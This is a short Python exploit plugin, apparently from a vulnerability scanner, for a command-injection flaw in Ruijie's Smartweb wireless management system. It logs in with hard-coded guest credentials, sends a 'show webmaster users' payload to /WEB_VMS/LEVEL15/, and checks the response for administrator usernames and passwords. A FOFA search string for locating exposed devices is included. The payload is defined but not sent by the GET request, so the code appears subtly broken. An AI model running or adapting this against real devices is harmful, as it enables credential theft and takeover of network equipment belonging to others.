#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/Lszwe7PIU58dBK8_wk-kfg',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '锐捷 Smartweb管理系统 命令注入',

      'level'     :   'high',

      'FOFA'      :   'title="无线smartWeb--登录页面"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Accept-Encoding': 'gzip, deflate',
      'Content-Type': 'application/x-www-form-urlencoded',
      'X-Requested-With': 'XMLHttpRequest',
      'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q=',
      'DNT': '1',
      'Cookie': 'auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest; login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302'
      }
  target = '/WEB_VMS/LEVEL15/'
  data = '''
command=show webmaster users&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.
  '''
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    # print(res.text)
    if re.search(r'<OPTION>.*?webmaster.*?level.*?username.*?password.*?<OPTION>.*?',res.text,re.S):
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret